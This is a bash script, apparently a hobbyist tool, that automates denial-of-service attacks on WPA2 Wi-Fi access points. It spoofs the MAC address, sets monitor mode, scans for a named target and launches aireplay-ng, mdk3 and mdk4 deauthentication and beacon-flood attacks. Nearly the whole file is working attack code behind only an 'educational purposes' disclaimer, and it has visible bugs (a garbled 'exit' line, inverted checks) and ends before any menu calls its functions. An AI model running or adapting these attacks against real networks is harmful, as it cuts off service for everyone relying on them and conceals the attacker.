#!/bin/bash

#this script is for educational purposes only
#I am not responsible for any damage caused by this script
#this script is for testing your own network or someone else's network with permission

#this script is a DOS attack for WPA2 APS
#by: TDonk994

#last commit date: 10/02/2024



echo "DOS Attack for WPA2 APS, using airodump, airmon, mdk3 and mdk4"
sleep 1
echo "make sure you have sudo privileges"
echo "make sure you have a wireless adapter able to go into monitor mode"
echo "recommend to use in dir desktop"
read -p "Do you want to continue? (y/n): " continue
if [ $continue == "n" ]; then
    echo "exiting"
    exit 1
else
    echo "continuing"
fi
sleep 1
echo "Checking if mdk3, mdk4 and aircrack-ng are installed"
#this variables check if the packages are installed
mdk3Check=$(sudo dpkg -s mdk3 &> /dev/null && echo "true" || echo "false")
mdk4Check=$(sudo dpkg -s mdk4 &> /dev/null && echo "true" || echo "false")
aircrackCheck=$(sudo dpkg -s aircrack-ng &> /dev/null && echo "true" || echo "false")
#this checks if mdk3 is installed
if [ $mdk3Check == "false" ]; then
    echo "mdk3 is not installed"
    read -p "Do you want to install mdk3? (y/n): " install
    if [ $install == "y" ]; then
        echo "installing mdk3"
        sudo apt-get install mdk3
        echo "mdk3 installed"
    else
        echo "mdk3 is required for this attack"
        exit 1
    fi
else
    echo "mdk3 is installed"
fi
#this checks if mdk4 is installed
if [ $mdk4Check == "false" ]; then
    echo "mdk4 is not installed"
    read -p "Do you want to install mdk4? (y/n): " install
    if [ $install == "y" ]
    then
        echo "installing mdk4"
        sudo apt-get install mdk4
        echo "mdk4 installed"
    else
        echo "mdk4 is required for this attack"
        exit 1
    fi
else
    echo "mdk4 is installed"
fi
#this checks if aircrack-ng is installed
if [ $aircrackCheck == "false" ]; then
    echo "aircrack-ng is not installed"
    read -p "Do you want to install aircrack-ng? (y/n): " install
    if [ $install == "y" ]; then
        echo "installing aircrack-ng"
        sudo apt-get install aircrack-ng
        echo "aircrack-ng installed"
    else
        echo "aircrack-ng is required for this attack"
        exit 1
    fi
else
    echo "aircrack-ng is installed"
fi
sudo cd ~/Desktop
#user input for a AP's name
read -p "Enter the AP's name: " AP
sleep 1
echo "The AP's name is: $AP"
#setting up the wireless adapter and other stuff that might interfere with the attack
echo "setting up the wireless adapter/interfaces"
sudo ifconfig eth0 down 
sudo ifconfig wlan0 down 
sudo macchanger wlan0 
sudo systemctl stop wpa_supplicant
sudo systemctl stop NetworkManager
sudo airmon-ng start wlan0
monitorcheck=$(sudo iwconfig wlan0 mode monitor &> /dev/null && echo "true" || echo "false")
if [ $monitorcheck == "false" ]; then
    echo "monitor mode is enabled"
else
    echo "monitor mode is not enabled"
    echo "changing to monitor mode"
    sudo iwconfig wlan0 mode monitor
fi
sudo ifconfig wlan0 up

For_aireplay () {
    echo "setting up aireplay-ng deauth attack"
    #deletes the files if they exist so no duplicates
    #also recommend to use the desktop directory for this
    if [ -e "wlan0-01.csv" ]; then
        rm wlan0-01.csv
        echo "removed wlan0-01.csv"
    else
        echo "no more wlan0-01.csv"
    fi
    if [ -e "bssid.csv" ]; then
        rm bssid.csv
        echo "removed bssid.csv"
    else
        echo "no more bssid.csv"
    fi
    if [ -e "bssid1.csv" ]; then
        rm bssid1.csv
        echo "removed bssid1.csv"
    else
        echo "no more bssid1.csv"
    fi
    if [ -e "bssid2.csv" ]; then
        rm bssid2.csv
        echo "removed bssid2.csv"
    else
        echo "no  more bssid2.csv"
    fi
    echo "all files deleted or non existent"
    sleep 1
    echo "starting airodump-ng to find $AP, this will take 30 seconds"
    sudo timeout 30 airodump-ng -b abg -N "$AP" wlan0 --write wlan0 --output-format csv
    sleep 32
    cat wlan0-01.csv | grep $AP > bssid.csv
    cat bssid.csv | sed 's/,//g' > bssid1.csv
    checknumberofbssids=$(cat bssid1.csv | awk '{print $1}' | wc -l)
    if [ $checknumberofbssids \> 1 ]; then
        echo "multiple bssids found"
        cat bssid1.csv | awk '{print}'
        cat bssid1.csv | awk '{print $1}' 
        read -p "which bssid do you want to use? type the whole mac address: " bssid
        echo "you chose $bssid"
        cat bssid1.csv | grep $bssid > bssid2.csv
        usedbssid=$(cat bssid2.csv | awk '{print $1}')
        usedchannel=$(cat bssid2.csv | awk '{print $6}') 
        echo "changing channel to $usedchannel"
        sleep 1
        sudo iwconfig wlan0 channel $usedchannel
        echo "starting aireplay-ng attack" 
        sleep 1
        read -p "how long do you want to run the attack for? (in seconds): " time
        if [ $time == "0" ]; then
            echo "running attack until you stop it"
            sudo aireplay-ng -0 0 -a $usedbssid wlan0
        elif [[ -n ${time//[0-9]/} ]]; then
            echo "invalid input"
            sleep 1 
            echo "running attack until you stop it (ctrl c)"
            sudo aireplay-ng -0 0 -a $usedbssid wlan0

        else
            echo "running attack for $time seconds"
            sudo aireplay-ng -0 $time -a $usedbssid wlan0
            echo "attack finished"
            sleep 1 
        fi
    else
        echo "only one bssid found"
        thebssid=$(cat bssid1.csv | awk '{print $1}')
        thechannel=$(cat bssid1.csv | awk '{print $6}')
        echo "changing channel to $thechannel"
        sleep 1
        sudo iwconfig wlan0 channel $thechannel
        read -p "how long do you want to run the attack for? (in seconds): " time2
        if [ $time2 == "0" ]; then
            echo "running attack until you stop it"
            sudo aireplay-ng -0 0 -a $thebssid wlan0
        elif [[ -n ${time2//[0-9]/} ]]; then
            echo "invalid input"
            sleep 1 
            echo "running attack until you stop it (ctrl c)"
            sudo aireplay-ng -0 0 -a $thebssid wlan0
        else
            echo "running attack for $time2 seconds"
            sudo aireplay-ng -0 $time2 -a $thebssid wlan0
            echo "attack finished"
            sleep 1
        fi
    fi
}


For_mdk3 () {
    echo "you chose mdk3"
    read -p "which attack do you want to use? deuth(1) or channel becon flood(2): " attack
    if [ $attack == 1 ]; then 
        echo "you chose deauth attack"
        echo "removing existing csv files"
        if [ -e "wlan0-01.csv" ]; then
            rm wlan0-01.csv
            echo "removed wlan0-01.csv"
        else
            echo "no more wlan0-01.csv"
        fi
        if [ -e "bssid.csv" ]; then
            rm bssid.csv
            echo "removed bssid.csv"
        else
            echo "no more bssid.csv"
        fi
        if [ -e "bssid1.csv" ]; then
            rm bssid1.csv
            echo "removed bssid1.csv"
        else
            echo "no more bssid1.csv"
        fi
        if [ -e "bssid2.csv" ]; then
            rm bssid2.csv
            echo "removed bssid2.csv"
        else
            echo "no  more bssid2.csv"
        fi
        echo "all files deleted or non existent"
        echo "starting airodump-ng to find APs, this will take 30 seconds"
        sudo timeout 30 airodump-ng -b abg wlan0 --write wlan0 --output-format csv
        sleep 32
        # this clears the "," from the csv file
        cat wlan0-01.csv | sed 's/,//g' > bssid1.csv
        #this should be the bssid/mac address v
        cat bssid1.csv | awk '{print $1}' > bssid.csv
        #this should be the channel v
        cat bssid1.csv | awk '{print $6}' > bssid.csv
        #this should be the SSID v
        #need to test to actually know what column it's in curretly don't know
        cat bssid1.csv | awk '{print $10}' > bssid.csv
        cat bssid.csv | awk '{print}'
        read -p "which AP?: " AP
        echo "you chose $AP"
        cat bssid.csv | grep $AP > bssid2.csv
        cat bssid2.csv | awk '{print $1}' > Black-List.txt
        channelused=$(cat bssid2.csv | awk '{print $2}')
        echo "starting mdk3 deauth attack"
        echo "cancel the attack with ctrl c"
        sudo mdk3 wlan0 d -c $channelused -b Black-List.txt

    elif [ $attack == 2 ]; then
        echo "you chose channel becon flood"
        read -p "which channel do you want to flood?: " channel
        if [[ -n ${channel//[0-9]/} ]]; then
            echo "invalid input"
            exit 1
        fi
        echo "you chose channel $channel"
        echo "starting mdk3 channel becon flood"
        echo "cancel the attack with ctrl c"
        sudo mdk3 wlan0 b -c $channel
    else
        echo "invalid input"
        exit 1
    fi
}



For_mdk4 () {
    echo "you chose mdk4"
    read -p "which attack do you want to use? deauth(1) or channel becon flood(2): " attack
    if [ $attack = 1 ];then
        echo "you chose deauth attack"
        echo "removing existing csv files"
        if [ -e "wlan0-01.csv" ]; then
        rm wlan0-01.csv
        echo "removed wlan0-01.csv"
        else
            echo "no more wlan0-01.csv"
        fi
        if [ -e "bssid.csv" ]; then
            rm bssid.csv
            echo "removed bssid.csv"
        else
            echo "no more bssid.csv"
        fi
        if [ -e "bssid1.csv" ]; then
            rm bssid1.csv
            echo "removed bssid1.csv"
        else
            echo "no more bssid1.csv"
        fi
        if [ -e "bssid2.csv" ]; then
            rm bssid2.csv
            echo "removed bssid2.csv"
        else
            echo "no  more bssid2.csv"
        fi
        echo "all files deleted or non existent"
        echo "starting airodump-ng to find APs, this will take 30 seconds"
        sudo timeout 30 airodump-ng -b abg wlan0 --write wlan0 --output-format csv
        sleep 32
        # this clears the "," from the csv file
        cat wlan0-01.csv | sed 's/,//g' > bssid1.csv
        #this should be the bssid/mac address v
        cat bssid1.csv | awk '{print $1}' > bssid.csv
        #this should be the SSID v
        #need to test to actually know what column it's in curretly don't know
        cat bssid1.csv | awk '{print $10}' > bssid.csv
        cat bssid.csv | awk '{print}'
        read -p "which AP?: " AP
        echo "you chose $AP"
        cat bssid.csv | grep $AP > bssid2.csv
        #this should be the bssid/mac address v
        usedbssid=$(cat bssid2.csv | awk '{print $1}')
        echo "starting mdk4 deauth attack"
        echo "cancel the attack with ctrl c"
        sudo mdk4 wlan0 d -b $usedbssid
    elif [ $attack = 2 ]; then
        echo "you chose channel becon flood"
        read -p "which channel do you want to flood?: " channel
        if [[ -n ${channel//[0-9]/} ]]; then
            echo "invalid input"
        e   xit 1
        else
            echo "you chose channel $channel"
        fi
        read -p "you can make a name for the fake APs, do you want to? (y/n): " name
        if [ $name == "y" ]; then
            read -p "what name do you want to use?: " name
            echo "you chose $name"
            echo "starting mdk4 channel becon flood"
            echo "cancel the attack with ctrl c"
            sudo mdk4 wlan0 b -n $name -c $channel
        elif [ $name == "n" ]; then
            echo "no name chosen, just use mdk3 bruh"
            echo "exiting"
            exit 1
        else
            echo "invalid input"
            exit 1
        fi
    else
        echo "invalid input"
        exit 1
    fi
}






#asking the user which attack they want to use
